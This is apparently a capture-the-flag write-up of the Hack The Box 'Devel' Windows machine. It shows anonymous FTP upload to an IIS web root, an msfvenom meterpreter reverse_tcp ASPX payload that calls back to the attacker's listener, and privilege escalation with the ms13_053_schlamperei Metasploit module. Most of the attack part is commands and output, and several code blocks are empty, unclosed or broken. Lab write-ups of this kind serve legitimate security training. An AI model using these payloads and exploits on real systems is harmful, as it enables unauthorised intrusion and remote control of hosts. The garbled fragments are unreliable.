The website has a default IIS page.
Something seems fishy!

Lets check out ftp

```{r, engine='bash', count_lines}

Anonymous login is allowed. 
Time to see whats inside
```{r, engine='bash', count_lines}

```
Why does this have a welcome.png, is this the webservers root ?
Lets put something in the folder and check if we can browse it

We first create a testfile
```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Machines/Devel# touch test.txt
root@kali:~/Hackthebox/Machines/Devel# echo thisisatest > test.txt 
root@kali:~/Hackthebox/Machines/Devel# cat test.txt 
thisisatest
```

Then put it into the ftp
```{r, engine='bash', count_lines}
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.

Voila! the file appears.

**Time for some shellz**

Was thinking of doing something with Insomnia shell but heck, metasploit is much easier
Create a reverse shell payload with msfvenom and upload it via the ftp

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Machines/Devel# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.155 LPORT=4444 -f aspx > dotaplayer.aspx
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of aspx file: 2
Final size of aspx file: 2751 bytes

```

Start a listner in msf

We start msfconsole and use the multi/handler
```{r, engine='bash', count_lines}
msf > use exploit/multi/handler
```

We need to tell the handler what payload to use and what to listen on
```{r, engine='bash', count_lines}
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf exploit(handler) > show options

Module options (exploit/multi/handler):

   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

LHOST => 10.10.15.155

[*] Exploit running as background job.

[*] Started reverse TCP handler on 10.10.15.155:4444 

```

We navigate to http://10.10.10.5/dotaplayer.aspx to spawn a reverse shell and this crops up on our terminal

We got **_shellz_**

Lets check out what we have
```{r, engine='bash', count_lines}
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

We try and browse to the user directory for our flag and we get **Access Denied**
Looks like we need to escalate privs for the user.txt as well :(


**Priv Esc**


```{r, engine='bash', count_lines}
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
```

Our best bet is to go to the local exploit sugester (best = easier in this case) 

We start by putting the current meterpreter sessoin in the background and invoking the local exploit suggester module
```{r, engine='bash', count_lines}
msf exploit(handler) > use post/multi/recon/local_exploit_suggester 
msf post(local_exploit_suggester) > set SESSION 1
SESSION => 1
```

It has some juicy info for us
```{r, engine='bash', count_lines}

**Hotfix(s):                 N/A**

Lets get ready to rumble!!!

Select our exploit and set its options
**_NOTE_**: we need to change the port from 4444 to 4443
This is because our primary exploit(the dotaplayer.aspx reverse shell) is connected on port 4444
```{r, engine='bash', count_lines}
msf post(local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
msf exploit(ms13_053_schlamperei) > set SESSION 1
SESSION => 1
msf exploit(ms13_053_schlamperei) > set LPORT 4443
LPORT => 4443
msf exploit(ms13_053_schlamperei) > set LHOST 10.10.15.155
LHOST => 10.10.15.155
msf exploit(ms13_053_schlamperei) > show options

Module options (exploit/windows/local/ms13_053_schlamperei):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.155     yes       The listen address
   LPORT     4443             yes       The listen port
